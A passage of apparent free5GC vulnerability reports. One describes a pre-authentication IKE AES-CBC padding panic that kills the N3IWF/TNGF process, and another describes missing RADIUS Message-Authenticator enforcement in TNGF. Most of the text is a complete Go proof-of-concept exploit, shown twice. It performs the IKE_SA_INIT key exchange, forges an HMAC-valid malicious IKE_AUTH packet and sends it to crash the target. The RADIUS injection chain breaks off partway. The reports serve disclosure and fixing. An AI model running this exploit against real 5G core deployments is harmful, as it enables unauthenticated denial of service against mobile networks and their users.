	fmt.Printf("[*] Target: %s (%s)\n\n", target, nfName)

	// ============================================================
	// Step 1: Generate DH-2048 key pair BEFORE IKE_SA_INIT
	// ============================================================
	fmt.Println("[1] Generating DH-2048 key pair...")

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	if dhType == nil {
		fmt.Println("[-] Failed to get DH-2048 type")
		os.Exit(1)
	}

	dhSecret, err := ike_security.GenerateRandomNumber()
	if err != nil {
		fmt.Printf("[-] Generate DH secret failed: %v\n", err)
		os.Exit(1)
	}
	localPublicValue := dhType.GetPublicValue(dhSecret)
	fmt.Printf("    DH public value: %d bytes\n", len(localPublicValue))

	// Generate local SPI
	spiBytes := make([]byte, 8)
	io.ReadFull(rand.Reader, spiBytes)
	initiatorSPI := binary.BigEndian.Uint64(spiBytes)

	// Generate local nonce
	localNonce := make([]byte, 32)
	io.ReadFull(rand.Reader, localNonce)

	// ============================================================
	// Step 2: Send IKE_SA_INIT with our DH public value
	// ============================================================
	fmt.Println("\n[2] Sending IKE_SA_INIT...")
	fmt.Printf("    Initiator SPI: 0x%016x\n", initiatorSPI)

	conn, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	useSHA1 := nfName == "TNGF"
	ikeInitMsg := buildIKESAInitWithAlgo(initiatorSPI, localPublicValue, localNonce, useSHA1)
	initBytes, err := ikeInitMsg.Encode()
	if err != nil {
		fmt.Printf("[-] Encode failed: %v\n", err)
		os.Exit(1)
	}

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write(initBytes)
	fmt.Printf("    Sent %d bytes\n", len(initBytes))

	// Receive response
	buf := make([]byte, 65535)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Printf("[-] No response: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("    Received %d bytes\n", n)

	// Decode response
	respMsg := new(ike_message.IKEMessage)
	if err := respMsg.Decode(buf[:n]); err != nil {
		fmt.Printf("[-] Decode failed: %v\n", err)
		os.Exit(1)
	}

	responderSPI := respMsg.ResponderSPI
	fmt.Printf("    Responder SPI: 0x%016x\n", responderSPI)

	// Extract response payloads
	var respSA *ike_message.SecurityAssociation
	var respKE *ike_message.KeyExchange
	var respNonce *ike_message.Nonce

	for _, p := range respMsg.Payloads {
		switch p.Type() {
		case ike_message.TypeSA:
			respSA = p.(*ike_message.SecurityAssociation)
		case ike_message.TypeKE:
			respKE = p.(*ike_message.KeyExchange)
		case ike_message.TypeNiNr:
			respNonce = p.(*ike_message.Nonce)
		}
	}

	if respSA == nil || respKE == nil || respNonce == nil {
		fmt.Println("[-] Missing SA/KE/Nonce in response")
		os.Exit(1)
	}

	chosenEncr := respSA.Proposals[0].EncryptionAlgorithm[0].TransformID
	chosenInteg := respSA.Proposals[0].IntegrityAlgorithm[0].TransformID
	chosenPRF := respSA.Proposals[0].PseudorandomFunction[0].TransformID
	chosenDH := respSA.Proposals[0].DiffieHellmanGroup[0].TransformID
	fmt.Printf("    Chosen: ENCR=%d INTEG=%d PRF=%d DH=%d\n",
		chosenEncr, chosenInteg, chosenPRF, chosenDH)

	// ============================================================
	// Step 3: Compute shared secret and derive IKE SA keys
	// ============================================================
	fmt.Println("\n[3] Computing DH shared secret and deriving IKE SA keys...")

	// Compute shared key using OUR secret and responder's public value
	peerPublicValueBig := new(big.Int).SetBytes(respKE.KeyExchangeData)
	sharedKey := dhType.GetSharedKey(dhSecret, peerPublicValueBig)
	fmt.Printf("    DH shared key: %d bytes (first 16: %s...)\n",
		len(sharedKey), hex.EncodeToString(sharedKey[:16]))

	// Concatenated nonce: initiator_nonce || responder_nonce
	concatenatedNonce := append(localNonce, respNonce.NonceData...)

	// Build IKESAKey and derive keys
	ikeSAKey := new(ike_security.IKESAKey)
	ikeSAKey.DhInfo = dh.DecodeTransform(respSA.Proposals[0].DiffieHellmanGroup[0])
	ikeSAKey.EncrInfo = encr.DecodeTransform(respSA.Proposals[0].EncryptionAlgorithm[0])
	ikeSAKey.IntegInfo = integ.DecodeTransform(respSA.Proposals[0].IntegrityAlgorithm[0])
	ikeSAKey.PrfInfo = prf.DecodeTransform(respSA.Proposals[0].PseudorandomFunction[0])

	if ikeSAKey.EncrInfo == nil || ikeSAKey.IntegInfo == nil || ikeSAKey.PrfInfo == nil || ikeSAKey.DhInfo == nil {
		fmt.Println("[-] Unsupported algorithm in response")
		os.Exit(1)
	}

	err = ikeSAKey.GenerateKeyForIKESA(concatenatedNonce, sharedKey, initiatorSPI, responderSPI)
	if err != nil {
		fmt.Printf("[-] Key derivation failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("    SK_ei (%d bytes): %s\n", len(ikeSAKey.SK_ei), hex.EncodeToString(ikeSAKey.SK_ei))
	fmt.Printf("    SK_ai (%d bytes): %s\n", len(ikeSAKey.SK_ai), hex.EncodeToString(ikeSAKey.SK_ai))
	fmt.Println("    [+] IKE SA keys derived successfully")

	// ============================================================
	// Step 4: Craft malicious encrypted IKE_AUTH
	// ============================================================
	fmt.Println("\n[4] Crafting malicious IKE_AUTH with padding overflow...")
	fmt.Println("    Attack: last byte of decrypted plaintext = 0xFF")
	fmt.Println("    → padding = int(0xFF) + 1 = 256")
	fmt.Println("    → plainText[:16-256] → panic: slice bounds out of range")

	// Create 16-byte plaintext with last byte = 0xFF
	maliciousPlaintext := make([]byte, aes.BlockSize)
	io.ReadFull(rand.Reader, maliciousPlaintext)
	maliciousPlaintext[aes.BlockSize-1] = 0xFF
	fmt.Printf("    Malicious plaintext: %s\n", hex.EncodeToString(maliciousPlaintext))

	// Encrypt with AES-CBC using SK_ei
	block, err := aes.NewCipher(ikeSAKey.SK_ei)
	if err != nil {
		fmt.Printf("[-] AES cipher error: %v\n", err)
		os.Exit(1)
	}

	iv := make([]byte, aes.BlockSize)
	io.ReadFull(rand.Reader, iv)

	encryptedBlock := make([]byte, aes.BlockSize)
	cbcEncrypter := cipher.NewCBCEncrypter(block, iv)
	cbcEncrypter.CryptBlocks(encryptedBlock, maliciousPlaintext)

	// encryptedData = IV || ciphertext
	encryptedData := append(iv, encryptedBlock...)

	// ============================================================
	// Step 5: Build IKE message with valid HMAC
	// ============================================================
	fmt.Println("\n[5] Building IKE_AUTH message with valid HMAC...")

	checksumLen := ikeSAKey.IntegInfo.GetOutputLength()

	// SK payload data = encrypted_data + placeholder_checksum
	skPayloadData := append(encryptedData, make([]byte, checksumLen)...)

	// IKE Header (28 bytes)
	ikeHeader := make([]byte, 28)
	binary.BigEndian.PutUint64(ikeHeader[0:8], initiatorSPI)
	binary.BigEndian.PutUint64(ikeHeader[8:16], responderSPI)
	ikeHeader[16] = byte(ike_message.TypeSK)
	ikeHeader[17] = 0x20
	ikeHeader[18] = ike_message.IKE_AUTH
	ikeHeader[19] = 0x08 // Initiator flag
	binary.BigEndian.PutUint32(ikeHeader[20:24], 1)

	// SK Payload Header (4 bytes)
	skPayloadHeader := make([]byte, 4)
	skPayloadHeader[0] = 0 // No Next Payload
	skPayloadHeader[1] = 0
	skPayloadLen := uint16(4 + len(skPayloadData))
	binary.BigEndian.PutUint16(skPayloadHeader[2:4], skPayloadLen)

	totalLen := uint32(28 + 4 + len(skPayloadData))
	binary.BigEndian.PutUint32(ikeHeader[24:28], totalLen)

	// Assemble
	fullMsg := make([]byte, 0, totalLen)
	fullMsg = append(fullMsg, ikeHeader...)
	fullMsg = append(fullMsg, skPayloadHeader...)
	fullMsg = append(fullMsg, skPayloadData...)

	// Compute HMAC(SK_ai, message_without_checksum)
	dataToSign := fullMsg[:len(fullMsg)-checksumLen]
	ikeSAKey.Integ_i.Reset()
	ikeSAKey.Integ_i.Write(dataToSign)
	computedHMAC := ikeSAKey.Integ_i.Sum(nil)[:checksumLen]

	copy(fullMsg[len(fullMsg)-checksumLen:], computedHMAC)

	fmt.Printf("    Message: %d bytes, HMAC: %s\n", len(fullMsg), hex.EncodeToString(computedHMAC))

	// ============================================================
	// Step 6: Verify target is alive, then send exploit
	// ============================================================
	fmt.Printf("\n[6] Sending exploit to %s...\n", nfName)
	fmt.Printf("    Pre-check: %s alive = %v\n", nfName, checkAlive(target))

	conn2, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn2.Close()

	conn2.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn2.Write(fullMsg)
	fmt.Printf("    Exploit sent (%d bytes)\n", len(fullMsg))
	fmt.Println("    Waiting 3 seconds...")
	time.Sleep(3 * time.Second)

	// ============================================================
	// Step 7: Check crash
	// ============================================================
	fmt.Printf("\n[7] Post-check: %s alive = %v\n", nfName, checkAlive(target))
	fmt.Printf("\n[*] Check container logs:\n")
	fmt.Printf("    docker logs %s 2>&1 | tail -30\n", containerName)
	fmt.Printf("    docker logs %s 2>&1 | grep -A5 'panic\\|slice bounds\\|runtime error'\n", containerName)
}

func buildIKESAInit(initiatorSPI uint64, keData []byte, nonceData []byte) *ike_message.IKEMessage {
	return buildIKESAInitWithAlgo(initiatorSPI, keData, nonceData, false)
}

func buildIKESAInitWithAlgo(initiatorSPI uint64, keData []byte, nonceData []byte, useSHA1 bool) *ike_message.IKEMessage {
	ikePayload := new(ike_message.IKEPayloadContainer)

	// SA Payload
	sa := ikePayload.BuildSecurityAssociation()
	proposal := sa.Proposals.BuildProposal(1, ike_message.TypeIKE, nil)

	proposal.EncryptionAlgorithm = append(proposal.EncryptionAlgorithm,
		&ike_message.Transform{
			TransformType:    ike_message.TypeEncryptionAlgorithm,
			TransformID:      ike_message.ENCR_AES_CBC,
			AttributePresent: true,
			AttributeFormat:  ike_message.AttributeFormatUseTV,
			AttributeType:    ike_message.AttributeTypeKeyLength,
			AttributeValue:   128,
		})

	if useSHA1 {
		// TNGF only supports SHA1-based algorithms
		proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
			&ike_message.Transform{
				TransformType: ike_message.TypeIntegrityAlgorithm,
				TransformID:   ike_message.AUTH_HMAC_SHA1_96,
			})
		proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
			&ike_message.Transform{
				TransformType: ike_message.TypePseudorandomFunction,
				TransformID:   ike_message.PRF_HMAC_SHA1,
			})
	} else {
		// N3IWF supports SHA2-256
		proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
			&ike_message.Transform{
				TransformType: ike_message.TypeIntegrityAlgorithm,
				TransformID:   ike_message.AUTH_HMAC_SHA2_256_128,
			})
		proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
			&ike_message.Transform{
				TransformType: ike_message.TypePseudorandomFunction,
				TransformID:   ike_message.PRF_HMAC_SHA2_256,
			})
	}

	proposal.DiffieHellmanGroup = append(proposal.DiffieHellmanGroup,
		&ike_message.Transform{
			TransformType: ike_message.TypeDiffieHellmanGroup,
			TransformID:   ike_message.DH_2048_BIT_MODP,
		})

	// KE Payload with our actual DH public value
	ikePayload.BuildKeyExchange(ike_message.DH_2048_BIT_MODP, keData)

	// Nonce
	ikePayload.BuildNonce(nonceData)

	return ike_message.NewMessage(initiatorSPI, 0,
		ike_message.IKE_SA_INIT, false, false, 0, *ikePayload)
}

func checkAlive(target string) bool {
	conn, err := net.DialTimeout("udp", target, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Generate a proper DH value for the probe
	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	secret, _ := ike_security.GenerateRandomNumber()
	pubVal := dhType.GetPublicValue(secret)
	nonce := make([]byte, 32)
	rand.Read(nonce)

	probe := buildIKESAInit(0x4141414141414141, pubVal, nonce)
	data, _ := probe.Encode()

	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(data)

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 4096)
	n, readErr := conn.Read(buf)
	return readErr == nil && n > 0
}

```

2. Restart TNGF and run PoC:

items.title: [Bugs] N3IWF IKE encrypted payload AES-CBC decryption panics on invalid padding value, allowing pre-authentication remote DoS
items.body:
## Bug Description

A remote, unauthenticated attacker can kill the entire N3IWF process by sending a single crafted IKE_AUTH message after completing an IKE_SA_INIT exchange. The `Decrypt()` function in the IKE library's `encr_aes_cbc.go` reads the last byte of the AES-CBC-decrypted plaintext as a padding length and uses it to slice the buffer without any bounds validation. When the attacker crafts an encrypted payload where the decrypted last byte is >= `0x10` (16), the computed padding exceeds the plaintext length, causing a negative slice index and an immediate **panic: slice bounds out of range**.

Because the N3IWF IKE server's `recover()` handler calls `Fatalf` (which invokes `os.Exit(1)`), this panic **terminates the entire N3IWF process** — not just the affected goroutine.

**No SIM card or authentication is required.** The attacker only needs to complete IKE_SA_INIT (one UDP round-trip) to derive IKE SA encryption and integrity keys, then send a single 80-byte crafted UDP packet.

**Crash site**:

`github.com/free5gc/ike@v1.2.0/security/encr/encr_aes_cbc.go` lines 149-150:
```go
func (encr *EncrAesCbcCrypto) Decrypt(cipherText []byte) ([]byte, error) {
    // ... AES-CBC decryption succeeds ...
    cbcBlockMode.CryptBlocks(plainText, encryptedMessage)

    padding := int(plainText[len(plainText)-1]) + 1     // line 149: attacker controls this value
    plainText = plainText[:len(plainText)-padding]       // line 150: PANIC when padding > len(plainText)

    return plainText, nil
}
```

**Normal operation**: The IKE library's `PKCS7Padding` (lib.go:27) sets the last padding byte to `padding_length - 1`. The `Decrypt()` function reverses this with `int(lastByte) + 1`. For a 16-byte AES block, valid last byte values are `0x00` through `0x0F` (padding 1-16).

**Attack**: The attacker encrypts a plaintext block where the last byte = `0xFF`. After AES-CBC decryption at the server: `padding = int(0xFF) + 1 = 256`. Then `plainText[:16-256]` = `plainText[:-240]` triggers the panic.

**Data flow**:

```
Attacker ──IKE_SA_INIT──▶ N3IWF       (DH exchange, both sides derive SK_ei/SK_ai)
Attacker ──IKE_AUTH(crafted)──▶ N3IWF

server.go:319   ike.DecodeDecrypt(msg, header, ikeSAKey, Role_Responder)
  └─ ike.go:205   verifyIntegrity(SK_ai)         ← passes (attacker has SK_ai)
  └─ ike.go:212   decryptPayload()
       └─ ike.go:149   Encr_i.Decrypt(cipherText)
            └─ encr_aes_cbc.go:149  padding = 256
            └─ encr_aes_cbc.go:150  plainText[:16-256]  ← PANIC
```

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with N3IWF deployed in Docker.

1. Build the PoC tool (requires Go 1.22+):

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"time"

	ike_message "github.com/free5gc/ike/message"
	ike_security "github.com/free5gc/ike/security"
	"github.com/free5gc/ike/security/dh"
	"github.com/free5gc/ike/security/encr"
	"github.com/free5gc/ike/security/integ"
	"github.com/free5gc/ike/security/prf"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "--null" {
		runEncrNullPoC()
		return
	}
	if len(os.Args) >= 2 && os.Args[1] == "--flood" {
		runSAFloodPoC()
		return
	}
	if len(os.Args) < 2 {
		fmt.Println("Usage: poc-aes-padding <target_ip:port> [n3iwf|tngf]")
		fmt.Println("       poc-aes-padding --null [target_ip:port]     (ENCR_NULL variant for TNGF)")
		os.Exit(1)
	}
	target := os.Args[1]
	nfName := "N3IWF"
	containerName := "n3iwf"
	if len(os.Args) > 2 && os.Args[2] == "tngf" {
		nfName = "TNGF"
		containerName = "tngf"
	}

	fmt.Printf("[*] PoC: AES-CBC Padding Overflow Crash (CVE pending)\n")
	fmt.Printf("[*] Target: %s (%s)\n\n", target, nfName)

	// ============================================================
	// Step 1: Generate DH-2048 key pair BEFORE IKE_SA_INIT
	// ============================================================
	fmt.Println("[1] Generating DH-2048 key pair...")

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	if dhType == nil {
		fmt.Println("[-] Failed to get DH-2048 type")
		os.Exit(1)
	}

	dhSecret, err := ike_security.GenerateRandomNumber()
	if err != nil {
		fmt.Printf("[-] Generate DH secret failed: %v\n", err)
		os.Exit(1)
	}
	localPublicValue := dhType.GetPublicValue(dhSecret)
	fmt.Printf("    DH public value: %d bytes\n", len(localPublicValue))

	// Generate local SPI
	spiBytes := make([]byte, 8)
	io.ReadFull(rand.Reader, spiBytes)
	initiatorSPI := binary.BigEndian.Uint64(spiBytes)

	// Generate local nonce
	localNonce := make([]byte, 32)
	io.ReadFull(rand.Reader, localNonce)

	// ============================================================
	// Step 2: Send IKE_SA_INIT with our DH public value
	// ============================================================
	fmt.Println("\n[2] Sending IKE_SA_INIT...")
	fmt.Printf("    Initiator SPI: 0x%016x\n", initiatorSPI)

	conn, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	useSHA1 := nfName == "TNGF"
	ikeInitMsg := buildIKESAInitWithAlgo(initiatorSPI, localPublicValue, localNonce, useSHA1)
	initBytes, err := ikeInitMsg.Encode()
	if err != nil {
		fmt.Printf("[-] Encode failed: %v\n", err)
		os.Exit(1)
	}

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write(initBytes)
	fmt.Printf("    Sent %d bytes\n", len(initBytes))

	// Receive response
	buf := make([]byte, 65535)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Printf("[-] No response: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("    Received %d bytes\n", n)

	// Decode response
	respMsg := new(ike_message.IKEMessage)
	if err := respMsg.Decode(buf[:n]); err != nil {
		fmt.Printf("[-] Decode failed: %v\n", err)
		os.Exit(1)
	}

	responderSPI := respMsg.ResponderSPI
	fmt.Printf("    Responder SPI: 0x%016x\n", responderSPI)

	// Extract response payloads
	var respSA *ike_message.SecurityAssociation
	var respKE *ike_message.KeyExchange
	var respNonce *ike_message.Nonce

	for _, p := range respMsg.Payloads {
		switch p.Type() {
		case ike_message.TypeSA:
			respSA = p.(*ike_message.SecurityAssociation)
		case ike_message.TypeKE:
			respKE = p.(*ike_message.KeyExchange)
		case ike_message.TypeNiNr:
			respNonce = p.(*ike_message.Nonce)
		}
	}

	if respSA == nil || respKE == nil || respNonce == nil {
		fmt.Println("[-] Missing SA/KE/Nonce in response")
		os.Exit(1)
	}

	chosenEncr := respSA.Proposals[0].EncryptionAlgorithm[0].TransformID
	chosenInteg := respSA.Proposals[0].IntegrityAlgorithm[0].TransformID
	chosenPRF := respSA.Proposals[0].PseudorandomFunction[0].TransformID
	chosenDH := respSA.Proposals[0].DiffieHellmanGroup[0].TransformID
	fmt.Printf("    Chosen: ENCR=%d INTEG=%d PRF=%d DH=%d\n",
		chosenEncr, chosenInteg, chosenPRF, chosenDH)

	// ============================================================
	// Step 3: Compute shared secret and derive IKE SA keys
	// ============================================================
	fmt.Println("\n[3] Computing DH shared secret and deriving IKE SA keys...")

	// Compute shared key using OUR secret and responder's public value
	peerPublicValueBig := new(big.Int).SetBytes(respKE.KeyExchangeData)
	sharedKey := dhType.GetSharedKey(dhSecret, peerPublicValueBig)
	fmt.Printf("    DH shared key: %d bytes (first 16: %s...)\n",
		len(sharedKey), hex.EncodeToString(sharedKey[:16]))

	// Concatenated nonce: initiator_nonce || responder_nonce
	concatenatedNonce := append(localNonce, respNonce.NonceData...)

	// Build IKESAKey and derive keys
	ikeSAKey := new(ike_security.IKESAKey)
	ikeSAKey.DhInfo = dh.DecodeTransform(respSA.Proposals[0].DiffieHellmanGroup[0])
	ikeSAKey.EncrInfo = encr.DecodeTransform(respSA.Proposals[0].EncryptionAlgorithm[0])
	ikeSAKey.IntegInfo = integ.DecodeTransform(respSA.Proposals[0].IntegrityAlgorithm[0])
	ikeSAKey.PrfInfo = prf.DecodeTransform(respSA.Proposals[0].PseudorandomFunction[0])

	if ikeSAKey.EncrInfo == nil || ikeSAKey.IntegInfo == nil || ikeSAKey.PrfInfo == nil || ikeSAKey.DhInfo == nil {
		fmt.Println("[-] Unsupported algorithm in response")
		os.Exit(1)
	}

	err = ikeSAKey.GenerateKeyForIKESA(concatenatedNonce, sharedKey, initiatorSPI, responderSPI)
	if err != nil {
		fmt.Printf("[-] Key derivation failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("    SK_ei (%d bytes): %s\n", len(ikeSAKey.SK_ei), hex.EncodeToString(ikeSAKey.SK_ei))
	fmt.Printf("    SK_ai (%d bytes): %s\n", len(ikeSAKey.SK_ai), hex.EncodeToString(ikeSAKey.SK_ai))
	fmt.Println("    [+] IKE SA keys derived successfully")

	// ============================================================
	// Step 4: Craft malicious encrypted IKE_AUTH
	// ============================================================
	fmt.Println("\n[4] Crafting malicious IKE_AUTH with padding overflow...")
	fmt.Println("    Attack: last byte of decrypted plaintext = 0xFF")
	fmt.Println("    → padding = int(0xFF) + 1 = 256")
	fmt.Println("    → plainText[:16-256] → panic: slice bounds out of range")

	// Create 16-byte plaintext with last byte = 0xFF
	maliciousPlaintext := make([]byte, aes.BlockSize)
	io.ReadFull(rand.Reader, maliciousPlaintext)
	maliciousPlaintext[aes.BlockSize-1] = 0xFF
	fmt.Printf("    Malicious plaintext: %s\n", hex.EncodeToString(maliciousPlaintext))

	// Encrypt with AES-CBC using SK_ei
	block, err := aes.NewCipher(ikeSAKey.SK_ei)
	if err != nil {
		fmt.Printf("[-] AES cipher error: %v\n", err)
		os.Exit(1)
	}

	iv := make([]byte, aes.BlockSize)
	io.ReadFull(rand.Reader, iv)

	encryptedBlock := make([]byte, aes.BlockSize)
	cbcEncrypter := cipher.NewCBCEncrypter(block, iv)
	cbcEncrypter.CryptBlocks(encryptedBlock, maliciousPlaintext)

	// encryptedData = IV || ciphertext
	encryptedData := append(iv, encryptedBlock...)

	// ============================================================
	// Step 5: Build IKE message with valid HMAC
	// ============================================================
	fmt.Println("\n[5] Building IKE_AUTH message with valid HMAC...")

	checksumLen := ikeSAKey.IntegInfo.GetOutputLength()

	// SK payload data = encrypted_data + placeholder_checksum
	skPayloadData := append(encryptedData, make([]byte, checksumLen)...)

	// IKE Header (28 bytes)
	ikeHeader := make([]byte, 28)
	binary.BigEndian.PutUint64(ikeHeader[0:8], initiatorSPI)
	binary.BigEndian.PutUint64(ikeHeader[8:16], responderSPI)
	ikeHeader[16] = byte(ike_message.TypeSK)
	ikeHeader[17] = 0x20
	ikeHeader[18] = ike_message.IKE_AUTH
	ikeHeader[19] = 0x08 // Initiator flag
	binary.BigEndian.PutUint32(ikeHeader[20:24], 1)

	// SK Payload Header (4 bytes)
	skPayloadHeader := make([]byte, 4)
	skPayloadHeader[0] = 0 // No Next Payload
	skPayloadHeader[1] = 0
	skPayloadLen := uint16(4 + len(skPayloadData))
	binary.BigEndian.PutUint16(skPayloadHeader[2:4], skPayloadLen)

	totalLen := uint32(28 + 4 + len(skPayloadData))
	binary.BigEndian.PutUint32(ikeHeader[24:28], totalLen)

	// Assemble
	fullMsg := make([]byte, 0, totalLen)
	fullMsg = append(fullMsg, ikeHeader...)
	fullMsg = append(fullMsg, skPayloadHeader...)
	fullMsg = append(fullMsg, skPayloadData...)

	// Compute HMAC(SK_ai, message_without_checksum)
	dataToSign := fullMsg[:len(fullMsg)-checksumLen]
	ikeSAKey.Integ_i.Reset()
	ikeSAKey.Integ_i.Write(dataToSign)
	computedHMAC := ikeSAKey.Integ_i.Sum(nil)[:checksumLen]

	copy(fullMsg[len(fullMsg)-checksumLen:], computedHMAC)

	fmt.Printf("    Message: %d bytes, HMAC: %s\n", len(fullMsg), hex.EncodeToString(computedHMAC))

	// ============================================================
	// Step 6: Verify target is alive, then send exploit
	// ============================================================
	fmt.Printf("\n[6] Sending exploit to %s...\n", nfName)
	fmt.Printf("    Pre-check: %s alive = %v\n", nfName, checkAlive(target))

	conn2, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn2.Close()

	conn2.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn2.Write(fullMsg)
	fmt.Printf("    Exploit sent (%d bytes)\n", len(fullMsg))
	fmt.Println("    Waiting 3 seconds...")
	time.Sleep(3 * time.Second)

	// ============================================================
	// Step 7: Check crash
	// ============================================================
	fmt.Printf("\n[7] Post-check: %s alive = %v\n", nfName, checkAlive(target))
	fmt.Printf("\n[*] Check container logs:\n")
	fmt.Printf("    docker logs %s 2>&1 | tail -30\n", containerName)
	fmt.Printf("    docker logs %s 2>&1 | grep -A5 'panic\\|slice bounds\\|runtime error'\n", containerName)
}

func buildIKESAInit(initiatorSPI uint64, keData []byte, nonceData []byte) *ike_message.IKEMessage {
	return buildIKESAInitWithAlgo(initiatorSPI, keData, nonceData, false)
}

func buildIKESAInitWithAlgo(initiatorSPI uint64, keData []byte, nonceData []byte, useSHA1 bool) *ike_message.IKEMessage {
	ikePayload := new(ike_message.IKEPayloadContainer)

	// SA Payload
	sa := ikePayload.BuildSecurityAssociation()
	proposal := sa.Proposals.BuildProposal(1, ike_message.TypeIKE, nil)

	proposal.EncryptionAlgorithm = append(proposal.EncryptionAlgorithm,
		&ike_message.Transform{
			TransformType:    ike_message.TypeEncryptionAlgorithm,
			TransformID:      ike_message.ENCR_AES_CBC,
			AttributePresent: true,
			AttributeFormat:  ike_message.AttributeFormatUseTV,
			AttributeType:    ike_message.AttributeTypeKeyLength,
			AttributeValue:   128,
		})

	if useSHA1 {
		// TNGF only supports SHA1-based algorithms
		proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
			&ike_message.Transform{
				TransformType: ike_message.TypeIntegrityAlgorithm,
				TransformID:   ike_message.AUTH_HMAC_SHA1_96,
			})
		proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
			&ike_message.Transform{
				TransformType: ike_message.TypePseudorandomFunction,
				TransformID:   ike_message.PRF_HMAC_SHA1,
			})
	} else {
		// N3IWF supports SHA2-256
		proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
			&ike_message.Transform{
				TransformType: ike_message.TypeIntegrityAlgorithm,
				TransformID:   ike_message.AUTH_HMAC_SHA2_256_128,
			})
		proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
			&ike_message.Transform{
				TransformType: ike_message.TypePseudorandomFunction,
				TransformID:   ike_message.PRF_HMAC_SHA2_256,
			})
	}

	proposal.DiffieHellmanGroup = append(proposal.DiffieHellmanGroup,
		&ike_message.Transform{
			TransformType: ike_message.TypeDiffieHellmanGroup,
			TransformID:   ike_message.DH_2048_BIT_MODP,
		})

	// KE Payload with our actual DH public value
	ikePayload.BuildKeyExchange(ike_message.DH_2048_BIT_MODP, keData)

	// Nonce
	ikePayload.BuildNonce(nonceData)

	return ike_message.NewMessage(initiatorSPI, 0,
		ike_message.IKE_SA_INIT, false, false, 0, *ikePayload)
}

func checkAlive(target string) bool {
	conn, err := net.DialTimeout("udp", target, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Generate a proper DH value for the probe
	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	secret, _ := ike_security.GenerateRandomNumber()
	pubVal := dhType.GetPublicValue(secret)
	nonce := make([]byte, 32)
	rand.Read(nonce)

	probe := buildIKESAInit(0x4141414141414141, pubVal, nonce)
	data, _ := probe.Encode()

	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(data)

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 4096)
	n, readErr := conn.Read(buf)
	return readErr == nil && n > 0
}
```

items.title: [Bugs] TNGF RADIUS handler does not enforce Message-Authenticator attribute, allowing unauthenticated NAS PDU injection into 5G core without RADIUS shared secret
items.body:
## Bug Description

The TNGF RADIUS handler processes `Access-Request` packets containing `EAP-Message` attributes without requiring or enforcing the `Message-Authenticator` attribute (Type 80). Per RFC 3579 Section 3.1, when an `Access-Request` includes an `EAP-Message` attribute, it **MUST** also include a `Message-Authenticator` attribute. The `Message-Authenticator` is an HMAC-MD5 computed with the RADIUS shared secret, and its absence means the packet's integrity and origin are completely unverified.

Because TNGF does not enforce this requirement, **any attacker who can send UDP packets to port 1812 can inject arbitrary RADIUS Access-Requests without knowing the RADIUS shared secret**. The attacker can progress through the full EAP-5G state machine and ultimately **inject arbitrary NAS PDUs into the AMF** via TNGF's NGAP interface.

**Vulnerable code** — `NFs/tngf/pkg/radius/handler/handler.go` lines 67-79:
```go
// Message-Authenticator is ONLY validated IF the attribute is present
case radius_message.TypeMessageAuthenticator:
    requestMessageAuthenticator = radiusPayload.Val
    // ... validate HMAC ...
    if !bytes.Equal(requestMessageAuthenticator, exRequestMessageAuthenticator) {
        radiusLog.Errorln("Request Message Authenticator error")
        return
    }
```

After the attribute parsing loop (line 80+), there is **no check** that `requestMessageAuthenticator != nil`. The handler proceeds directly to session lookup and EAP-5G processing:

```go
// Line 80-85: No enforcement that Message-Authenticator was present
var session *context.RadiusSession
session, ok := tngfSelf.RadiusSessionPoolLoad(callingStationId)
if !ok {
    session = tngfSelf.NewRadiusSession(callingStationId)
}

switch session.State {
case EAP5GStart:
    // Process Identity → send 5G-Start (no auth required)
case EAP5GNAS:
    // Process EAP-5G NAS → forward NAS PDU to AMF (no auth required)
```

**Complete attack chain** (verified on live Docker):

```
Step 1: Attacker → TNGF:1812 (UDP)
  RADIUS Access-Request:
    Calling-Station-Id = "AA-BB-CC-DD-EE-FF"
    EAP-Message = EAP-Response/Identity("anonymous")
    [NO Message-Authenticator]

  TNGF → Attacker:
    Access-Challenge + EAP-Request/5G-Start       ← Session created, state → EAP5GNAS

Step 2: Attacker → TNGF:1812 (UDP)
  RADIUS Access-Request:
